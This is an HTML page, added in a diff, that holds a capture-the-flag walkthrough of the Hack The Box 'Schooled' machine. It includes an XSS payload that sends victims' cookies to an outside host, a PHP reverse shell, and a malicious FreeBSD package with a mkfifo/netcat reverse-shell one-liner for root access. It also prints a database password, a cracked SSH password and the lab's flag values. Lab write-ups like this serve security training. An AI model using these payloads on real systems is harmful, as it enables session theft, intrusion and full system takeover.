@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<title>Love Walkthough..</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="index.css">
+<head>
+   <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" </link>
+</head>
+
+<style>
+   body {font-family: "yu gothic"}
+   .Slides {display: none}
+</style>
+
+<body>
+<!-- Navigation bar -->
+<div id='nav'>
+<ul>
+    <li><a href="index 2.html">Home</a></li>
+    <li><a href="#about">About us</a></li>
+    <li><a href="#contact">Join us</a></li>
+    <li><a href="article selection.html">Articles</a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+    <li><a href="#spacer"></a></li>
+<br><br>
+    <pre class="ascii-art"><b>
+
+▓█████--██▓----▓█████--▄████▄--▄▄▄█████▓-██▀███---▒█████---██-▄█▀▄▄▄-----▄▄▄█████▓
+▓█---▀-▓██▒----▓█---▀-▒██▀-▀█--▓--██▒-▓▒▓██-▒-██▒▒██▒--██▒-██▄█▒▒████▄---▓--██▒-▓▒
+▒███---▒██░----▒███---▒▓█----▄-▒-▓██░-▒░▓██-░▄█-▒▒██░--██▒▓███▄░▒██--▀█▄-▒-▓██░-▒░
+▒▓█--▄-▒██░----▒▓█--▄-▒▓▓▄-▄██▒░-▓██▓-░-▒██▀▀█▄--▒██---██░▓██-█▄░██▄▄▄▄██░-▓██▓-░-
+░▒████▒░██████▒░▒████▒▒-▓███▀-░--▒██▒-░-░██▓-▒██▒░-████▓▒░▒██▒-█▄▓█---▓██▒-▒██▒-░-
+░░-▒░-░░-▒░▓--░░░-▒░-░░-░▒-▒--░--▒-░░---░-▒▓-░▒▓░░-▒░▒░▒░-▒-▒▒-▓▒▒▒---▓▒█░-▒-░░---
+-░-░--░░-░-▒--░-░-░--░--░--▒-------░------░▒-░-▒░--░-▒-▒░-░-░▒-▒░-▒---▒▒-░---░----
+---░-----░-░------░---░----------░--------░░---░-░-░-░-▒--░-░░-░--░---▒----░------
+---░--░----░--░---░--░░-░------------------░---------░-░--░--░--------░--░--------
+----------------------░-----------------------------------------------------------
+
+   </b></pre>
+   </ul>
+   </div>
+
+<!-- image container -->
+<div class="slideshow-container"> <!-- beginning of image container -->
+
+<!-- Slideshow -->
+<div class="Slides fade">
+   <img src="schooled.jpg" style="width:100%">
+   <div class="text"><i>Hack the box Schooled Machine Walkthough</i></div>
+<br>
+   <p class="caption_text"><del>Scholled Walkthough</del></p>
+</div>
+</div> <!-- end of image container -->
+
+<!-- Slideshow java script -->
+<script>
+var myIndex = 0;
+carousel();
+
+function carousel() {
+var i;
+var x = document.getElementsByClassName("Slides");
+for (i = 0; i < x.length; i++) {
+x[i].style.display = "none";  
+}
+myIndex++;
+if (myIndex > x.length) {myIndex = 1}    
+x[myIndex-1].style.display = "block";  
+setTimeout(carousel, 4000);    
+}
+</script>
+
+<br>
+
+<!-- Writers info container -->
+<div class="writers-container"> <!-- beginning of writers cotainer -->
+<div class="row">
+<div class="column">
+   <p class="writers_names" style="font-size: 18px"><b><i>Virgo Foxxi</i></b></p>
+</div>
+<div class="column">
+   <p class="writers_date" style="font-size: 18px"><i>22nd September 2021 // 10:38</i></p>
+</div>
+<div class="column">
+   <img  class="box666" src="http://www.hackthebox.eu/badge/image/524661" alt="Hack The Box">
+</div>
+</div>
+</div> <!-- end of writers container -->
+
+<!-- breakup section -->
+<div class="breakup-container"> <!-- beginning of breakup container -->
+   <img src="news story breakup.jpg" alt="breakup" style="width:100%">
+</div> <!-- end of breakup container -->
+
+<!-- article section -->
+<div class="article-container"> <!-- beginning of breakup container -->
+
+<!-- space fore article -->
+<pre class="article-text" style="font-size: 18px; font-family: "yu gothic"; float: left;">
+
+--██████--▄████▄---██░-██--▒█████---▒█████---██▓----▓█████-▓█████▄-
+▒██----▒-▒██▀-▀█--▓██░-██▒▒██▒--██▒▒██▒--██▒▓██▒----▓█---▀-▒██▀-██▌
+░-▓██▄---▒▓█----▄-▒██▀▀██░▒██░--██▒▒██░--██▒▒██░----▒███---░██---█▌
+--▒---██▒▒▓▓▄-▄██▒░▓█-░██-▒██---██░▒██---██░▒██░----▒▓█--▄-░▓█▄---▌
+▒██████▒▒▒-▓███▀-░░▓█▒░██▓░-████▓▒░░-████▓▒░░██████▒░▒████▒░▒████▓-
+▒-▒▓▒-▒-░░-░▒-▒--░-▒-░░▒░▒░-▒░▒░▒░-░-▒░▒░▒░-░-▒░▓--░░░-▒░-░-▒▒▓--▒-
+░-░▒--░-░--░--▒----▒-░▒░-░--░-▒-▒░---░-▒-▒░-░-░-▒--░-░-░--░-░-▒--▒-
+░--░--░--░---------░--░░-░░-░-░-▒--░-░-░-▒----░-░------░----░-░--░-
+------░--░-░-------░--░--░----░-░------░-░------░--░---░--░---░----
+---------░--------------------------------------------------░------
+--------------------------------------------
+my ip = 10.10.14.67
+machine (schooled) ip = 10.10.10.234
+machine OS = freebsd
+--------------------------------------------
+running a basic nmap scan on the ip reveals 2 open ports:
+
+ 22 - ssh  (open ssh / freebsd)
+ 80 - http (apache httpd 2.4.46)
+
+checking the webpage it reveals a school page, looking around it shows us
+that the page is using moodle which is used for schools amd collages.
+as such i run gobuster on the site revealing a subdomain of: 
+
+ moodle.schooled.htb
+
+checking this site reveals a signup for the course
+signing up for the maths course and then checking the cve's for moodle.
+it shows its vulnerable to xxs, and checking the moodle page shows it allows
+us to use cross site scripting in this section using a payload of:
+
+ /image src=x onerror=this.src='http://666/?c='+document.cookie/
+
+--------------------------------------------
+change the / into < and >
+--------------------------------------------
+
+after loading up a netcat listener and waiting a little, we get philps cookie
+adding / swapping this in allows us acess to his account.
+after doing this we can use burp to get the manager account by using 
+the role id to 1.
+
+using this we can upload a reverse.php share and opening a nc listener,
+and we gain a reverse shell to the machine but no access to user accounts.
+looking around there is a config.php file which gives us the db pass of:
+
+ dbpass = PlaybookMaster2020
+
+after looking around the database we manage to get the password hash for jamie 
+as such using john gives us jamies pass for ssh:
+
+   username = jamie
+   password = !QAZ2wsx
+--------------------------------------------
+signing in gives us acces to jamies account and the user token / flag:
+
+ user flag = 44d03e354eba20c0a4d3aac7d0c8b5d4
+--------------------------------------------
+now that we have access to jamie we will use it to gain root,
+looking at sudo -l we have access to pkg install.
+moving to the directory /tmp we can begin to create, a malious pkg:
+--------------------------------------------
+ #!/bin/sh
+ STAGEDIR=/tmp/package
+ rm -rf ${STAGEDIR}
+ mkdir -p ${STAGEDIR}
+ cat // ${STAGEDIR}/+PRE_INSTALL // EOF
+ # careful here, this may clobber your system
+ echo “Resetting root shell”
+ rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.14.67 6660 >/tmp/a
+ EOF
+ cat // ${STAGEDIR}/+POST_INSTALL //EOF
+
+# careful here, this may clobber your system
+
+ echo “Registering root shell”
+ pw usermod -n root -s /bin/sh
+ EOF
+ cat  ${STAGEDIR}/+MANIFEST EOF
+ name: mypackage
+ version: “1.0_5”
+ origin: sysutils/mypackage
+ comment: “automates stuff”
+ desc: “automates tasks which can also be undone later”
+ maintainer: john@doe.it
+ www: https://doe.it
+ prefix: /
+ EOF
+ pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
+
+--------------------------------------------
+after doing this we chmod it and run it before changing it to run with the pkg,
+application, after opening a netcat listener on the same port.
+doing thist allows us access to root upon the system
+
+allowing us to get there root flag / token:
+
+   root flag / token = a91ecbb6912619bc1193a9f0f8900c1e
+--------------------------------------------
+</pre>
+</div><!-- end of article container -->
+
+<br>
+<br>
+<!-- Footer Section -->
+<div class="footer_container" style="width:100%"> <!-- beginning of Footer container -->
+   
+</Div> <!-- end of footer container -->
+   <div style="background-color: black;"></div>
+   <img src="footer (3).png" style="width:100%">
+</body>
+</html>
